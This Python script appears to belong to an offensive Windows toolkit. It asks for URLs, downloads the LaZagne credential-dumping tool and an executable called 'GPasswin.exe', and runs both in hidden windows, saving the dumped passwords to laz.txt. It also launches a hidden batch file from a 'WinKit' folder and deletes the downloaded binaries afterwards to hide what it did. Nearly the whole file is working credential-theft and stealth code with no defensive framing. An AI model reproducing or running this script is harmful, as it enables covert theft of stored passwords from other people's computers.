import requests , shutil
import subprocess 
import os , sys ,os.path
from sys import platform
import wmi ,ctypes,socket,platform,time
import termcolor , platform
#Directly execution 
#--------- status 
info = termcolor.colored("[!]",'cyan')
oka = termcolor.colored("[+]",'green')
fai = termcolor.colored("[X]",'red')
err = termcolor.colored("[?]",'yellow')
inpu = termcolor.colored("[-]",'magenta')
kaz = ""
#--------- File name & Path
GPasswin = "GPasswin.exe"
lazagne = "lazagne.exe"

#---------- find info 
sysdriv = os.getenv("SystemDrive") # System Driver C:/
curruse = os.getlogin() # Username 

#---------- URL Tools 

def infor():
     print("{} user PC : {} ".format(info,curruse))
     print("{} OS : {}  :: {} ".format(info,os.name,platform.platform()))
     print("{} Path script : {}".format(info,os.getcwd()))

def downloadGP(): # function to download the file via URL 
    url = input("{} Enter URL GPasswin.exe : ".format(inpu))
    r = requests.get(url, allow_redirects=True)
    open(r'{}'.format(GPasswin), 'wb').write(r.content)
    

def lazGP():
    url = input("{} Enter URL lazagne.exe : ".format(inpu))
    r = requests.get(url, allow_redirects=True)
    open(r'{}'.format(lazagne), 'wb').write(r.content) 
    

def checkexist(): #check if the file download it or not 
    while True :
        if os.path.isfile("{}".format(lazagne)) : 
            print("{} Downloaded :: lazagne ".format(oka))
            if os.path.isfile("{}".format(GPasswin)):
                print("{} Downloaded :: GPasswin ".format(oka))
                break
        else :
            print("{} re-download it ".format(err))
            downloadGP()
            lazGP()
            time.sleep(10)
            continue

def exechideGP(): # execute the file with hidden mode
    SW_HIDE = 0
    info = subprocess.STARTUPINFO()
    info.dwFlags = subprocess.STARTF_USESHOWWINDOW
    info.wShowWindow = SW_HIDE
    GPasswinP = subprocess.Popen(r"{}".format(GPasswin),startupinfo=info)
    lazagneP = subprocess.Popen(["powershell.exe",".\{} all > laz.txt".format(lazagne)],startupinfo=info)

    
def exechideBat(): # execute the file with hidden mode
    sysdriv = os.getenv("SystemDrive")
    SW_HIDE = 0
    info = subprocess.STARTUPINFO()
    info.dwFlags = subprocess.STARTF_USESHOWWINDOW
    info.wShowWindow = SW_HIDE
    subprocess.Popen(r"{}/WinKit/rootsys/ps/gp.bat".format(sysdriv),startupinfo=info)

def clevents():
    os.system("del {}".format(GPasswin))
    os.system("del {}".format(lazagne))

#------------------- start execute 
try : 
    print("------------------------------------------------------")
    infor()
    print("------------------------------------------------------")
    downloadGP()
    lazGP()
    time.sleep(1)
    checkexist()
    exechideGP()
    exechideBat() 
    print("{} Waiting a few min pls ... ".format(info))
    time.sleep(10)
    clevents()
    print("{} All clear work done ".format(oka))
except PermissionError  : 
    print("{} You dont have permission :(".format(fai))

